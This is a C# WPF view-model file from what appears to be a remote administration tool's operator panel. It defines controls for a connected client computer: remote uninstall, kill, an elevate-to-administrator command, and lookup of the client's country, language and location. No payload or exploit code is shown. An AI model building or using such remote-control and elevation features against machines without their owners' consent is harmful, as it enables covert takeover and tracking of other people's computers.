using System;
using System.Globalization;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Core;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Orcus.StaticCommands.Client;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class ClientControlViewModel : CommandView
    {
        private IClientCommands _clientCommands;
        private LocationInfo _clientLocation;
        private RelayCommand _killCommand;
        private RelayCommand _makeAdminCommand;
        private string _replacePath;
        private RelayCommand _uninstallCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Control"];
        public override Category Category { get; } = Category.Client;
        public OnlineClientInformation ComputerInformation { get; private set; }
        public string LanguageName { get; private set; }
        public string CountryName { get; private set; }

        public string ReplacePath
        {
            get { return _replacePath; }
            set { SetProperty(value, ref _replacePath); }
        }

        public LocationInfo ClientLocation
        {
            get { return _clientLocation; }
            set { SetProperty(value, ref _clientLocation); }
        }

        public RelayCommand UninstallCommand
        {
            get
            {
                return _uninstallCommand ?? (_uninstallCommand = new RelayCommand(parameter =>
                {
                    ClientController.StaticCommander.ExecuteCommand(new UninstallCommand(),
                        new ImmediatelyTransmissionEvent(), null, StopEvent.Default, null,
                        CommandTarget.FromClients(ClientController.Client));
                }));
            }
        }

        public RelayCommand KillCommand
        {
            get
            {
                return _killCommand ?? (_killCommand = new RelayCommand(parameter =>
                {
                    ClientController.StaticCommander.ExecuteCommand(new KillCommand(),
                        new ImmediatelyTransmissionEvent(), null, StopEvent.Default, null,
                        CommandTarget.FromClients(ClientController.Client));
                }));
            }
        }

        public RelayCommand MakeAdminCommand
        {
            get
            {
                return _makeAdminCommand ?? (_makeAdminCommand = new RelayCommand(parameter =>
                {
                    ClientController.StaticCommander.ExecuteCommand(new MakeAdminCommand(),
                        new ImmediatelyTransmissionEvent(), null, StopEvent.Default, null,
                        CommandTarget.FromClients(ClientController.Client));
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            ComputerInformation = clientController.Client;
            try
            {
                var cultureInfo = new CultureInfo(ComputerInformation.Language);
                LanguageName = Settings.Current.Language.CultureInfo.ThreeLetterISOLanguageName ==
                               CultureInfo.InstalledUICulture.ThreeLetterISOLanguageName
                    ? cultureInfo.DisplayName
                    : cultureInfo.EnglishName;
            }
            catch (Exception)
            {
                LanguageName = ComputerInformation.Language;
            }

            if (ComputerInformation.LocatedCountry != null)
                try
                {
                    var region = new RegionInfo(ComputerInformation.LocatedCountry);
                    CountryName = Settings.Current.Language.CultureInfo.ThreeLetterISOLanguageName ==
                                  CultureInfo.InstalledUICulture.ThreeLetterISOLanguageName
                        ? region.DisplayName
                        : region.EnglishName;
                }
                catch (Exception)
                {
                    CountryName = string.Format((string) Application.Current.Resources["UnknownRegion"],
                        ComputerInformation.LocatedCountry);
                }
            _clientCommands = clientController.ClientCommands;
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(
                    new Uri("pack://application:,,,/Resources/Images/VisualStudio/ConnectEnvironment_16x.png",
                        UriKind.Absolute));
        }

        public override async void LoadView(bool loadData)
        {
            ClientLocation = await Task.Run(() => _clientCommands.GetClientLocation(ClientController.Client));
        }
    }
}